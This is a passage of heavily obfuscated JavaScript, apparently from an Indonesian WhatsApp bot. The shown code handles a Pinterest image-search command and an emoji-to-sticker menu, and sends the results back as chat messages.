buttonsxox=[_0x2bfb39,_0x39da3c],btnxo___={'contentText':_0x406083(0x386,0x22,0x80e,-0x10),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x4aaba1(0x4fa,0x111,0x7ef,0x48b)+_0x4aaba1(0xcb9,0xbab,0x1148,0x812))+sender[_0x4aaba1(0x6ab,0x721,0x7db,0x38c)]('@')[0x1f4+-0x8*-0x101+-0x11c*0x9],'buttons':buttonsxox,'headerType':0x4,'imageMessage':bacotluxxo[_0x4aaba1(0x49c,0x467,0x4e8,0x56a)][_0x406083(0x731,0x955,0x355,0x7d3)+'ge']},_0x3ff496={};_0x3ff496[_0x4aaba1(0xce3,0xf3a,0xad0,0x112c)]=mek,alpha[_0x406083(0x87f,0x8c1,0x3de,0xb41)+'e'](from,btnxo___,MessageType['buttonsMes'+_0x4aaba1(0x4ff,0x4c6,0x6d3,0x190)],_0x3ff496)[_0x4aaba1(0xacb,0xc46,0xaf3,0xc9f)](_0x5a0ad4=>{const _0x375216={'bFwFH':function(_0x3174b1,_0xe604a){return _0x3174b1(_0xe604a);},'VXOgp':_0x289773(0x89f,0x742,0x375,0x276)+'salahan,\x20c'+_0x1479b6(0x462,0x528,0xed,0x7e9)+'pa\x20saat\x20la'+'gi'};function _0x289773(_0x477412,_0x5869df,_0x5c3111,_0x2ae5a8){return _0x406083(_0x5869df-0x12e,_0x5869df-0x17,_0x5c3111-0x1ea,_0x2ae5a8);}function _0x1479b6(_0x12f598,_0x512bc6,_0x416068,_0x236876){return _0x4aaba1(_0x12f598-0x18,_0x416068,_0x416068-0x1cf,_0x236876-0x1c3);}_0x375216[_0x289773(0xab0,0x69a,0xa1a,0x79b)](reply,_0x375216[_0x1479b6(0xa25,0xe8c,0x8ac,0xc0c)]);});break;case _0x406083(0x5a5,0x1ad,0x37d,0x698):case _0x4aaba1(0x9ce,0xca3,0xa25,0x79d):if(!q)return reply(_0x4aaba1(0xc12,0xe1e,0x729,0x723)+_0x406083(0xb35,0xca5,0x6d2,0xb9e));async function pinterestSearch(_0x56bb80){const _0x567ca7={'dxrNF':function(_0x230d11,_0x131638,_0x537809){return _0x230d11(_0x131638,_0x537809);},'yeZNR':function(_0x210110,_0x4aa125){return _0x210110*_0x4aa125;},'dARMc':function(_0x453d56,_0x55d3c3){return _0x453d56(_0x55d3c3);},'zNpYK':'LhNzf','TvpOO':_0x316f2b(0x7f9,0xc50,0xd12,0xb41),'XeTFW':_0x316f2b(0xb58,0x1d9,0x6ac,0x367),'hMAfk':_0x4f1b54(0xb98,0xbe2,0xb21,0xe96),'IZlFB':_0x4f1b54(0x3be,0x68d,0x71b,0x82f)+'n','oedAA':'XMLHttpReq'+_0x4f1b54(0xb54,0x76e,0x84c,0x8b4),'iwaQh':_0x316f2b(0x5a6,0x8a1,0x834,0xa55)+_0x4f1b54(0x9d7,0x843,0xcb6,0x92a)+_0x316f2b(0x935,0xfa,0x427,0x25b),'ApjBe':_0x4f1b54(0xb55,0x75a,0x7bb,0x62b),'bRVDP':_0x316f2b(0x201,0x85b,0x5a8,0x66a),'MmrgU':_0x4f1b54(0x86c,0xa45,0x651,0xc7c)};function _0x4f1b54(_0x4738fe,_0x2d75f2,_0x36c21c,_0x4eb120){return _0x4aaba1(_0x2d75f2-0x61,_0x36c21c,_0x36c21c-0x83,_0x4eb120-0x25);}function _0x316f2b(_0x3b6806,_0x38523e,_0x2f6a76,_0x4c2120){return _0x4aaba1(_0x2f6a76- -0x2f,_0x38523e,_0x2f6a76-0x151,_0x4c2120-0x10c);}return new Promise((_0x42dc0c,_0x29efe5)=>{const _0xc8c3ed={'fFwTz':function(_0x135f11,_0x19978e,_0x152201){function _0x4f884c(_0x4be846,_0xea9d78,_0x590476,_0x32cc25){return _0x34ec(_0x4be846-0x219,_0xea9d78);}return _0x567ca7[_0x4f884c(0x946,0xdba,0x51b,0xa03)](_0x135f11,_0x19978e,_0x152201);},'lENVK':function(_0x1f0342,_0x2b812b){function _0x4c5836(_0x3e3912,_0x35698d,_0x359069,_0x480306){return _0x34ec(_0x480306- -0x89,_0x35698d);}return _0x567ca7[_0x4c5836(0x6c0,0x60c,0x96e,0x9b6)](_0x1f0342,_0x2b812b);},'fILWH':function(_0x392ced,_0x49d2b2){function _0x49d83f(_0x64c23e,_0x22c760,_0x528434,_0x1005bf){return _0x34ec(_0x64c23e-0x2e4,_0x528434);}return _0x567ca7[_0x49d83f(0x75e,0x3a0,0x6a9,0x49d)](_0x392ced,_0x49d2b2);}};function _0x454f05(_0x306e37,_0x2b37e6,_0x596793,_0x136be9){return _0x4f1b54(_0x306e37-0xfd,_0x306e37- -0x11d,_0x136be9,_0x136be9-0x118);}function _0x3f684a(_0x2356f7,_0x29b12d,_0x52ef84,_0x41c647){return _0x316f2b(_0x2356f7-0x6e,_0x2356f7,_0x29b12d-0xc7,_0x41c647-0x1a1);}_0x567ca7[_0x3f684a(0x6f3,0x9ab,0xa4f,0xa8d)]===_0x567ca7[_0x454f05(0x5ba,0x852,0x6fb,0xa02)]?_0x1135ac['get'](''+_0x172024)[_0x3f684a(0xd77,0xbfd,0xea6,0xaad)](_0x23ef3b=>{_0x582462=''+_0x23ef3b[_0x56af2e(0xc92,0x760,0x9e4,0xa2d)][0xbad+-0x8a8*-0x3+-0x25a0]['url'],_0x455c74[_0x56af2e(0x312,-0x37,0x3ed,-0x12)](_0x1c249c);function _0x1c07f3(_0x440467,_0x33314b,_0xafd7be,_0x5c185e){return _0x454f05(_0x440467-0x251,_0x33314b-0x23,_0xafd7be-0x1db,_0xafd7be);}function _0x56af2e(_0xb02e24,_0x1e1563,_0x5c9707,_0x5e80ab){return _0x3f684a(_0x1e1563,_0x5c9707- -0x142,_0x5c9707-0x12e,_0x5e80ab-0x157);}_0xc8c3ed[_0x56af2e(0xaec,0x651,0x945,0x47b)](_0x542ffc,_0x9e5ad3,''+_0x46e309);}):_0x567ca7[_0x3f684a(0xbec,0x98e,0x49c,0x9ad)](fetch,'https://ww'+_0x3f684a(0xcca,0x87a,0xc84,0x9cf)+_0x3f684a(0xb1a,0xa67,0x863,0x6de)+_0x454f05(0x8cd,0xcc5,0xd48,0x8ec)+_0x454f05(0xcd8,0x9d6,0xd9e,0x84e)+'rce/get/?s'+'ource_url='+_0x454f05(0x7f9,0x526,0xc93,0xc52)+_0x454f05(0xc32,0xa4a,0xba8,0xa24)+_0x454f05(0x414,-0xa6,-0x28,0x640)+_0x56bb80+(_0x454f05(0xb37,0xbf9,0xc2c,0x61a)+_0x3f684a(0x52b,0x9fd,0x82d,0xeb9)+'22%3A%7B%2'+'2isPrefetc'+'h%22%3Afal'+_0x454f05(0x38b,0x425,0x25f,0x97)+_0x3f684a(0xb62,0x7ec,0x80d,0xa8e)+'22')+_0x56bb80+(_0x454f05(0xa3f,0xd83,0xd01,0x95d)+_0x3f684a(0x16d,0x4a4,0x4a5,0x485)+_0x454f05(0x7e9,0x444,0xb80,0x7dc)+_0x454f05(0xafd,0x65b,0xdfd,0x5df)+_0x3f684a(0x86d,0xd8d,0xd8d,0x1263)+_0x454f05(0xc28,0x10cc,0x809,0x8f8)+_0x454f05(0x69c,0x366,0x652,0x1ab)+_0x3f684a(0xc22,0x916,0x44a,0x5c9)+_0x3f684a(0x2ca,0x544,0x9dd,0x40c)+_0x3f684a(0x8f2,0x465,0x36b,0x295)+_0x3f684a(0xa5a,0x5f5,0x944,0x61b)+_0x3f684a(0x4e5,0x97f,0xe73,0x900)+'59'),{'headers':{'accept':_0x454f05(0x83b,0x537,0x4a0,0x916)+'n/json,\x20te'+'xt/javascr'+_0x3f684a(0x95e,0x65f,0x829,0xafb)+_0x454f05(0x46e,0x8a2,0x8e6,0x5f5),'accept-language':'en-US,en;q'+_0x454f05(0xc55,0x954,0xee0,0xf0a),'cache-control':_0x3f684a(0x839,0x773,0xaa3,0x481),'pragma':_0x567ca7['XeTFW'],'sec-fetch-dest':_0x567ca7['hMAfk'],'sec-fetch-mode':_0x454f05(0x928,0xc37,0xb84,0x61d),'sec-fetch-site':_0x567ca7[_0x454f05(0xa01,0x6ab,0xdbc,0x50b)],'sec-gpc':'1','x-app-version':_0x3f684a(0x596,0xa7f,0x9a2,0x6a2),'x-pinterest-appstate':'active','x-requested-with':_0x567ca7[_0x454f05(0x58e,0x5e4,0xa90,0x89b)]},'referrer':_0x567ca7[_0x3f684a(0x1327,0xe47,0x1182,0xc40)],'referrerPolicy':_0x567ca7[_0x3f684a(0x18f,0x530,0x84e,0x9c2)],'body':null,'method':_0x567ca7[_0x454f05(0x9f1,0xc8a,0x779,0x571)],'mode':_0x567ca7[_0x3f684a(0xdba,0xb50,0x6d5,0x6b3)]})[_0x454f05(0xaa9,0xb30,0xf63,0x857)](_0x5ad3e4=>_0x5ad3e4[_0x3f684a(0xa82,0x620,0x3b4,0x9c9)]())[_0x3f684a(0x88b,0xbfd,0x1020,0x787)](_0x4eff5c=>{function _0x3e10a6(_0x4662fa,_0x52d016,_0x1c2266,_0x3f229a){return _0x454f05(_0x3f229a- -0x23,_0x52d016-0x1d9,_0x1c2266-0xe7,_0x52d016);}const _0x37fb65=_0x4eff5c[_0x3e10a6(0xf0d,0xa2e,0x6c6,0xbe9)+_0x54642f(0x94,0x30f,0x428,0x311)][_0x3e10a6(0x8c2,0xc5c,0x7ad,0x849)][_0x3e10a6(0x593,0x73c,0x47e,0x757)][Math[_0x54642f(0xa1,0x11f,0xf2,0x3bf)](_0xc8c3ed[_0x3e10a6(0x10db,0xb75,0xfc4,0xbed)](Math['random'](),_0x4eff5c['resource_r'+_0x3e10a6(0x52a,0x62,0x3c1,0x3d8)]['data'][_0x54642f(0x413,0x819,0x836,0x4ee)]['length']))];var _0x9662ac=[];const _0x49e372={};_0x49e372['link']=_0x37fb65[_0x3e10a6(0xd5c,0xaab,0xadf,0x9af)]['orig'][_0x3e10a6(0x437,0x626,0xcd3,0x932)],_0x9662ac[_0x3e10a6(0xac0,0xb78,0x88c,0xa2f)](_0x49e372);function _0x54642f(_0x1fefe7,_0x57ed44,_0x390723,_0x51fc3c){return _0x454f05(_0x1fefe7- -0x367,_0x57ed44-0x99,_0x390723-0x176,_0x390723);}_0xc8c3ed[_0x54642f(0x769,0xc6f,0x4a3,0x659)](_0x42dc0c,_0x9662ac);})[_0x3f684a(0xe6f,0xb63,0x998,0xcac)](_0x29efe5);});}const pinterest=_0x46d2db=>new Promise((_0x10924f,_0xe39dd2)=>{function _0x187bb0(_0x4aa593,_0x5c7ac,_0x39e0f6,_0x47547f){return _0x4aaba1(_0x4aa593- -0x464,_0x47547f,_0x39e0f6-0xfa,_0x47547f-0x127);}const _0x108a64={'SRhCY':function(_0x332eda,_0x11da28){return _0x332eda(_0x11da28);},'SlyvM':_0x2949bc(0x3ff,0x1d8,0x3f6,0x59e),'WNMiP':'ZnxMx','nHxJC':function(_0x42a0be,_0x3a1a3f){return _0x42a0be(_0x3a1a3f);}};function _0x2949bc(_0x55dd40,_0x3d0b52,_0x4a5d77,_0x5e9dbb){return _0x4aaba1(_0x5e9dbb- -0x348,_0x3d0b52,_0x4a5d77-0xd2,_0x5e9dbb-0x75);}_0x108a64['nHxJC'](pinterestSearch,_0x46d2db)[_0x2949bc(0x696,0x73f,0x599,0x81d)](_0x366ad0=>{const _0x3731b5={'bcigH':function(_0x4f07da,_0x31bc19){function _0x1cd1d3(_0x133d45,_0x53325f,_0x2020d9,_0x1e0e39){return _0x34ec(_0x53325f-0x29c,_0x1e0e39);}return _0x108a64[_0x1cd1d3(0xd64,0xc7a,0xe48,0x1036)](_0x4f07da,_0x31bc19);}};function _0x1f9410(_0x47da2b,_0x1ba78d,_0x3bc0ed,_0x4f74e8){return _0x187bb0(_0x3bc0ed-0xc0,_0x1ba78d-0x1f3,_0x3bc0ed-0x1cd,_0x47da2b);}function _0x3397ba(_0xee2c92,_0x12c270,_0x5de21c,_0x55619d){return _0x187bb0(_0x55619d-0xae,_0x12c270-0x1be,_0x5de21c-0xeb,_0xee2c92);}if(_0x108a64[_0x3397ba(0x610,0xd99,0x6a7,0x8ce)]===_0x108a64[_0x3397ba(0x5d5,0x361,0x578,0x2cd)])_0x3731b5[_0x1f9410(0x24b,0x23d,0x67d,0x8c5)](_0x551a16,'Terjadi\x20ke'+_0x3397ba(0x572,-0x64,0x545,0x6c)+'oba\x20bebera'+'pa\x20saat\x20la'+'gi');else{const _0xa52e23={};_0xa52e23['status']=0xc8,_0xa52e23['image']=_0x366ad0[-0x26a1+-0x4f*0x47+0x142e*0x3][_0x3397ba(-0x69,0x58c,0x1d3,0x83)],_0x108a64[_0x3397ba(0x382,0x69d,-0x92,0x3dd)](_0x10924f,_0xa52e23);}})[_0x187bb0(0x667,0x1d4,0x2ce,0x1dd)](_0xe39dd2);});pinterest(q)[_0x4aaba1(0xb65,0x106c,0xb04,0x788)](async _0x2a826a=>{function _0x250628(_0x2f9085,_0x462e09,_0x141bdd,_0x463bb6){return _0x4aaba1(_0x462e09- -0x1e2,_0x2f9085,_0x141bdd-0xdb,_0x463bb6-0x8e);}function _0x4d9bd5(_0x5e4a97,_0x1a4d52,_0x201ccd,_0x45f8d9){return _0x406083(_0x201ccd-0xad,_0x1a4d52-0xe1,_0x201ccd-0x149,_0x5e4a97);}const _0x268127={'naTYH':function(_0x5c9a98,_0x3dfae8){return _0x5c9a98(_0x3dfae8);}};let _0x4a0485=await _0x268127[_0x250628(0x653,0x380,0x5f6,0x7cd)](getBuffer,_0x2a826a[_0x4d9bd5(0x5df,0x839,0x4c0,0x78b)]);alpha[_0x250628(0xa1d,0x6d2,0x236,0x671)+'e'](from,_0x4a0485,MessageType['image'],{'caption':_0x250628(0x401,0x212,0x279,-0x1e1)+_0x250628(0x93b,0x5ec,0x266,0x141)+q,'quoted':mek,'thumbnail':Buffer[_0x250628(0xa97,0x58a,0x58b,0x6dc)](0x2395+0xb83*0x1+-0x2f18)});})['catch'](async _0x3d8ce3=>{function _0x31928b(_0x3321a2,_0x3549b2,_0x1a9a89,_0x89f35){return _0x4aaba1(_0x3549b2-0x1e4,_0x89f35,_0x1a9a89-0x12d,_0x89f35-0x73);}function _0x2c0014(_0x354d74,_0x24d53e,_0x502a00,_0x4b6afc){return _0x4aaba1(_0x4b6afc- -0x4a0,_0x502a00,_0x502a00-0xc8,_0x4b6afc-0x6d);}const _0x5dda60={'hasKj':function(_0x2fbaf0,_0x42211c){return _0x2fbaf0(_0x42211c);}};_0x5dda60[_0x2c0014(-0x3b3,-0x4f7,0x33a,0x16)](reply,_0x2c0014(-0x15c,0xea,0x565,0x1a9)+_0x2c0014(0x857,0x4df,0x847,0x635));});break;case _0x4aaba1(0x968,0x68a,0x8e1,0x744):case _0x4aaba1(0x8a3,0x8d5,0x6e8,0x3d0):if(!q)return reply(_0x4aaba1(0xc59,0x98e,0x925,0xa96));qes=args[_0x406083(0xadd,0x694,0x819,0xba1)]('\x20');const _0x3c48be={};_0x3c48be[_0x406083(0xa57,0x9cc,0x837,0x66b)]=_0x406083(0x5f2,0xaec,0x2b6,0x157)+'e-'+qes,_0x3c48be['descriptio'+'n']=''+creator,_0x3c48be['rowId']=''+qes;const _0x1cad4d={};_0x1cad4d[_0x4aaba1(0xa8c,0x62f,0xa70,0x581)]=_0x4aaba1(0x875,0x6c0,0xc28,0xae2)+_0x4aaba1(0xdbe,0x119c,0x114a,0x11bb)+qes,_0x1cad4d[_0x406083(0x4d9,0x784,0x36d,0x116)+'n']=''+creator,_0x1cad4d[_0x4aaba1(0x3fd,0x422,0x33c,0x4d1)]=''+qes;const _0x1a11bb={};_0x1a11bb[_0x406083(0xa57,0xc37,0x616,0x945)]=_0x4aaba1(0xb23,0x96c,0x9cd,0x788)+_0x4aaba1(0x7e8,0x477,0x7a5,0x487)+qes,_0x1a11bb[_0x406083(0x4d9,0x48d,0x228,0x507)+'n']=''+creator,_0x1a11bb['rowId']=''+qes;const _0x494225={};_0x494225[_0x406083(0xa57,0x9fa,0xc3c,0x5d4)]=_0x4aaba1(0xa78,0xf06,0x9ee,0xebb)+'osoft-'+qes,_0x494225[_0x4aaba1(0x50e,0x513,0xa2d,0x802)+'n']=''+creator,_0x494225[_0x406083(0x3c8,0x8ed,0x662,0x69c)]=''+qes;const _0x416144={};_0x416144[_0x4aaba1(0xa8c,0xb4e,0xce8,0xe61)]='Emoji-What'+_0x4aaba1(0x775,0x805,0x29a,0xba5)+qes,_0x416144[_0x4aaba1(0x50e,0x748,0x585,0x6be)+'n']=''+creator,_0x416144['rowId']=''+qes;const _0x33e926={};_0x33e926[_0x4aaba1(0xa8c,0x5e1,0xb8e,0xd61)]=_0x406083(0x694,0x49e,0x8d1,0x384)+_0x4aaba1(0xc2b,0xc5b,0x109b,0x1115)+qes,_0x33e926[_0x4aaba1(0x50e,0x5da,0x6cc,0x3d2)+'n']=''+creator,_0x33e926[_0x406083(0x3c8,0x4d1,0x121,0x5ee)]=''+qes;const _0x51f6db={};_0x51f6db['title']='Emoji-Face'+_0x406083(0x51e,0x906,0x6a1,0x9d9)+qes,_0x51f6db[_0x4aaba1(0x50e,0x8d7,-0x5,0x67a)+'n']=''+creator,_0x51f6db['rowId']=''+qes;const _0x46f185={};_0x46f185[_0x4aaba1(0xa8c,0x6bc,0x9fd,0x62f)]=_0x406083(0xd22,0x868,0x1071,0x11f3)+_0x406083(0xc9d,0xeb4,0xcf9,0x1089)+qes,_0x46f185[_0x4aaba1(0x50e,0x32a,0x904,0x36)+'n']=''+creator,_0x46f185['rowId']=''+qes;const _0x2a3680={};_0x2a3680[_0x4aaba1(0xa8c,0x909,0x612,0x803)]='Emoji-Open'+'Moji-'+qes,_0x2a3680[_0x4aaba1(0x50e,0xa05,0x181,0x3bb)+'n']=''+creator,_0x2a3680['rowId']=''+qes;const _0x4e4650={};_0x4e4650[_0x406083(0xa57,0xaee,0x5f9,0xe13)]=_0x4aaba1(0x679,0x91c,0x730,0x7d5)+_0x4aaba1(0x43a,0x870,0x726,0x5d1)+qes,_0x4e4650['descriptio'+'n']=''+creator,_0x4e4650[_0x406083(0x3c8,0x458,0x674,0x6a6)]=''+qes;const _0xf19d1a={};_0xf19d1a['title']=_0x406083(0x7ee,0x495,0xadf,0xb61)+'enger-'+qes,_0xf19d1a[_0x406083(0x4d9,0x538,0x5a3,0x9aa)+'n']=''+creator,_0xf19d1a[_0x4aaba1(0x3fd,0x688,0x8bd,0x30a)]=''+qes;const _0x569250={};_0x569250[_0x406083(0xa57,0xee4,0xbde,0xaee)]=_0x4aaba1(0x65c,0x412,0x5ae,0x601)+qes,_0x569250['descriptio'+'n']=''+creator,_0x569250[_0x4aaba1(0x3fd,0x899,-0x6a,0x455)]=''+qes;const _0x46bcd1={};_0x46bcd1['title']=_0x406083(0x5e9,0xd1,0x5ab,0x86e)+qes,_0x46bcd1[_0x4aaba1(0x50e,0x80a,0x9d0,0xe0)+'n']=''+creator,_0x46bcd1[_0x406083(0x3c8,0x736,0x84f,0x96)]=''+qes;const rows12=[_0x3c48be,_0x1cad4d,_0x1a11bb,_0x494225,_0x416144,_0x33e926,_0x51f6db,_0x46f185,_0x2a3680,_0x4e4650,_0xf19d1a,_0x569250,_0x46bcd1],_0x14a28f={};_0x14a28f[_0x4aaba1(0xa8c,0xb4d,0xbee,0xf6c)]='Pilih\x20sala'+'h\x20satu',_0x14a28f[_0x4aaba1(0x647,0x9a6,0x303,0x8a5)]=rows12;const sections12=[_0x14a28f],listt12={'buttonText':_0x4aaba1(0xcb8,0xb67,0xa12,0x925)+'E','title':_0x406083(0x68c,0xb3b,0x38d,0x246)+'\x20','description':_0x406083(0x4bf,0x33d,0x549,0x87a)+sender[_0x406083(0x676,0x94d,0x6a3,0x964)]('@')[-0x1*0x1a6e+0x11c2+0x8ac]+(_0x4aaba1(0x68d,0x2c7,0x554,0x775)+_0x406083(0x75d,0x331,0xa8f,0x4a8)+_0x406083(0x940,0xe4d,0xbbf,0x702)+_0x4aaba1(0x882,0xd86,0x491,0x4d0)+_0x406083(0xa27,0xafa,0x9c3,0xe8e)+_0x4aaba1(0x91b,0x9bd,0x8c2,0x994)+'n\x20dipilih!'),'footerText':''+tampilTanggal+enter+tampilWaktu,'sections':sections12,'listType':0x1},_0xffb53b={};_0xffb53b[_0x4aaba1(0x88d,0x879,0xc5d,0x98f)+'id']=[sender];const _0x41461f={};_0x41461f[_0x4aaba1(0xce3,0xe04,0xef6,0xb3d)]=ftoko,_0x41461f[_0x406083(0x852,0x6ac,0x869,0x984)+'o']=_0xffb53b,alpha['sendMessag'+'e'](from,listt12,MessageType[_0x406083(0x7c6,0x49f,0x38c,0xa4f)+'e'],_0x41461f);break;}sub_yt_zeeone_ofc==_0x4aaba1(0x627,0x95b,0x7b9,0x9b9)+'e-'+q5&&(reply(lang[_0x4aaba1(0x45a,0x2a9,0x564,0x91e)]()),emoji[_0x4aaba1(0x86a,0x547,0x36d,0x81a)](''+q5)[_0x4aaba1(0xb65,0x760,0xff1,0x877)](_0x3f21fa=>{function _0x39f1f7(_0x4f2862,_0x229436,_0x2ac637,_0x5b0a99){return _0x4aaba1(_0x4f2862- -0x247,_0x5b0a99,_0x2ac637-0x1b1,_0x5b0a99-0x178);}const _0x5694b4={'yiMWX':function(_0x27a06e,_0x2ffde0,_0x4ef12d){return _0x27a06e(_0x2ffde0,_0x4ef12d);}};function _0x3fd802(_0x3848da,_0x38d797,_0x4bc274,_0x1c6e0d){return _0x4aaba1(_0x3848da- -0x6f,_0x4bc274,_0x4bc274-0x33,_0x1c6e0d-0x13);}teks=''+_0x3f21fa[_0x39f1f7(0x847,0x9a6,0x3f3,0xc74)][0xe84+0x1*-0x25b7+-0x1733*-0x1]['url'],console['log'](teks),_0x5694b4[_0x3fd802(0x77b,0x78b,0x7a9,0x457)](sendStickerFromUrl,from,''+teks);}));sub_yt_zeeone_ofc==_0x4aaba1(0x875,0xbc7,0x769,0x86d)+'le-'+q5&&emoji[_0x4aaba1(0x86a,0xcb0,0xaaf,0xc40)](''+q5)['then'](_0xf8f8bf=>{const _0x414b21={'sdFGb':function(_0x6a3623,_0x80871f,_0x3b4da1){return _0x6a3623(_0x80871f,_0x3b4da1);}};teks=''+_0xf8f8bf[_0x1f5908(0xc3c,0x9df,0xc7d,0x1173)][-0x9*-0x130+0x1c7*0x11+-0x28e6][_0x1f5908(0xd06,0xbbf,0xc00,0xf6e)];function _0x1f5908(_0x2dc0df,_0x221403,_0x104a28,_0x5bed5c){return _0x406083(_0x104a28-0x224,_0x221403-0x16d,_0x104a28-0x8c,_0x221403);}console[_0x1f5908(0x844,0x462,0x686,0x55b)](teks);function _0xd8244f(_0x96c9bc,_0x59c081,_0x3ef8ff,_0x7a32dd){return _0x406083(_0x96c9bc-0x12e,_0x59c081-0x110,_0x3ef8ff-0x3b,_0x7a32dd);}_0x414b21[_0x1f5908(0xc82,0x4b4,0x888,0x640)](sendStickerFromUrl,from,''+teks);});sub_yt_zeeone_ofc==_0x4aaba1(0xb23,0xd27,0x737,0x82b)+_0x406083(0x7b3,0x865,0x4f5,0x71b)+q5&&(reply(lang[_0x406083(0x425,0x870,0x33c,0x51a)]()),emoji['get'](''+q5)[_0x406083(0xb30,0xb56,0x671,0x85f)](_0x13910b=>{const _0x17e72f={'jgPEH':function(_0x15e52d,_0x33a465,_0xa2644a){return _0x15e52d(_0x33a465,_0xa2644a);}};teks=''+_0x13910b[_0x518772(0xa4a,0x22d,0x650,0x69c)][0x425*0x2+0x1*-0xf7f+0x737][_0x17843b(0x5a5,0x979,0xa12,0x884)],console[_0x17843b(0x2b,-0xd5,0x2a4,0x295)](teks);function _0x17843b(_0x5e1486,_0xe09ce6,_0x42a17c,_0x3d58e6){return _0x406083(_0x5e1486- -0x437,_0xe09ce6-0x1c4,_0x42a17c-0x12e,_0x3d58e6);}function _0x518772(_0x52f404,_0x3ae0dc,_0x57674a,_0x375d3e){return _0x406083(_0x375d3e- -0x3bd,_0x3ae0dc-0x1ce,_0x57674a-0x1de,_0x57674a);}_0x17e72f['jgPEH'](sendStickerFromUrl,from,''+teks);}));sub_yt_zeeone_ofc=='Emoji-Micr'+_0x4aaba1(0x48d,0x6f9,0x424,0x614)+q5&&emoji[_0x4aaba1(0x86a,0x997,0xca2,0xa8b)](''+q5)[_0x4aaba1(0xb65,0x9fe,0x7ff,0xa96)](_0x29dac5=>{const _0x56950b={'tqwoy':function(_0x1acae6,_0x19b4a0,_0x371139){return _0x1acae6(_0x19b4a0,_0x371139);}};teks=''+_0x29dac5[_0x4dcb15(0xf2b,0x65b,0xa90,0xd88)][0xaf8+-0x17*0xb5+0x54e]['url'];function _0x4dcb15(_0x35e03a,_0x2c0bd3,_0x2b1f68,_0x2f23ea){return _0x4aaba1(_0x2b1f68-0x2,_0x2c0bd3,_0x2b1f68-0x1d9,_0x2f23ea-0x38);}function _0x3de2a9(_0x2953f8,_0x356240,_0x12e01b,_0x24b50e){return _0x4aaba1(_0x12e01b- -0x348,_0x356240,_0x12e01b-0x3f,_0x24b50e-0x65);}console[_0x3de2a9(-0x163,0x255,0x14f,-0x217)](teks),_0x56950b['tqwoy'](sendStickerFromUrl,from,''+teks);});sub_yt_zeeone_ofc==_0x4aaba1(0xbb5,0x9a0,0xd5a,0x72f)+'sApp-'+q5&&(reply(lang[_0x406083(0x425,-0xc6,0x5a5,-0xd8)]()),emoji[_0x4aaba1(0x86a,0x7e8,0x963,0xbf7)](''+q5)['then'](_0x5f368e=>{const _0x56c833={'SxCzh':function(_0x56e282,_0x4536fa,_0x1831a9){return _0x56e282(_0x4536fa,_0x1831a9);}};teks=''+_0x5f368e[_0x4ab523(0x487,0x21c,0x5dd,0x9d5)][-0x1ea9+-0xa*-0x2b3+0x3af][_0x4ab523(0x1cb,0x812,0x560,0xa24)];function _0x4ab523(_0x47bf8f,_0x416a68,_0x4ee2b3,_0x3f7ce4){return _0x4aaba1(_0x4ee2b3- -0x4b1,_0x3f7ce4,_0x4ee2b3-0xf6,_0x3f7ce4-0x101);}function _0x4865ac(_0x3e611f,_0x504b2e,_0xaf6c05,_0x311204){return _0x4aaba1(_0x311204- -0x228,_0x504b2e,_0xaf6c05-0xf9,_0x311204-0x1c6);}console[_0x4ab523(0x2da,-0xca,-0x1a,-0x51c)](teks),_0x56c833['SxCzh'](sendStickerFromUrl,from,''+teks);}));sub_yt_zeeone_ofc==_0x406083(0x694,0x1d4,0x93c,0x1d2)+_0x406083(0xbf6,0x966,0xee4,0xdda)+q5&&emoji['get'](''+q5)[_0x406083(0xb30,0xd11,0x63e,0x7ac)](_0x2bf4d1=>{teks=''+_0x2bf4d1[_0x263675(0xec3,0x73c,0xabd,0xe0f)][-0x6ff*-0x1+0x6*-0x6f+0xa*-0x70][_0x263675(0xb4c,0x9f1,0xa40,0x779)];function _0x31a940(_0x40efff,_0x36ba92,_0x1902ef,_0x1830e5){return _0x406083(_0x1830e5-0x10d,_0x36ba92-0x16d,_0x1902ef-0x5c,_0x36ba92);}function _0x263675(_0x438e72,_0x8ce16f,_0x2fc899,_0x40a05e){return _0x406083(_0x2fc899-0x64,_0x8ce16f-0x120,_0x2fc899-0x166,_0x40a05e);}console['log'](teks),sendStickerFromUrl(from,''+teks);});sub_yt_zeeone_ofc==_0x406083(0x636,0x572,0x317,0xb51)+_0x4aaba1(0x553,0x3d8,0x84,0x1d0)+q5&&(reply(lang[_0x4aaba1(0x45a,0x1b1,0xb4,0xe0)]()),emoji['get'](''+q5)[_0x4aaba1(0xb65,0xbd3,0xb6e,0xac0)](_0x2b4f4b=>{teks=''+_0x2b4f4b[_0x32db3b(0xb98,0x6e3,0xf50,0xde3)][0x2*0x8b6+-0x1*-0x2269+0x1145*-0x3][_0x60c63e(0x5b6,0xad5,0xcca,0xa35)];function _0x60c63e(_0x3764eb,_0x218169,_0x471a85,_0x34fdc8){return _0x406083(_0x34fdc8-0x59,_0x218169-0x66,_0x471a85-0x1de,_0x3764eb);}function _0x32db3b(_0xf83529,_0x3f64c0,_0x5c3462,_0x16cf5b){return _0x406083(_0xf83529-0x13f,_0x3f64c0-0x1ad,_0x5c3462-0x132,_0x5c3462);}console['log'](teks),sendStickerFromUrl(from,''+teks);}));sub_yt_zeeone_ofc==_0x406083(0xd22,0x8b6,0xc6a,0xd26)+_0x4aaba1(0xcd2,0xcd6,0xab6,0xc40)+q5&&emoji[_0x406083(0x835,0x95b,0x399,0x766)](''+q5)[_0x4aaba1(0xb65,0x934,0xd63,0xfa3)](_0x3d2a00=>{function _0x5a6949(_0x1c08bc,_0x403d6a,_0x5d6b69,_0x2a2e5f){return _0x4aaba1(_0x403d6a-0xcb,_0x5d6b69,_0x5d6b69-0x143,_0x2a2e5f-0xf9);}function _0x41b34a(_0x152974,_0x4bb89e,_0x38c647,_0x305de2){return _0x406083(_0x152974- -0x1de,_0x4bb89e-0xb8,_0x38c647-0xaa,_0x4bb89e);}teks=''+_0x3d2a00[_0x41b34a(0x87b,0x87b,0xaf4,0xbc2)][0x24*0x61+-0x45f+-0x2*0x49f]['url'],console[_0x41b34a(0x284,0x384,0x343,0x60)](teks),sendStickerFromUrl(from,''+teks);});sub_yt_zeeone_ofc==_0x406083(0xc76,0x94f,0xf04,0xc48)+_0x406083(0x7e2,0x9dc,0x8a1,0xbeb)+q5&&emoji['get'](''+q5)[_0x406083(0xb30,0xd80,0xc5d,0xabf)](_0x408b68=>{function _0x4cf5d4(_0x9659ab,_0x54c720,_0x4fc7e2,_0x4e860b){return _0x4aaba1(_0x4e860b- -0x20,_0x4fc7e2,_0x4fc7e2-0x13,_0x4e860b-0x79);}function _0x2c3424(_0x4de7e8,_0xf8a17a,_0x2ce182,_0x15eb2d){return _0x406083(_0x4de7e8- 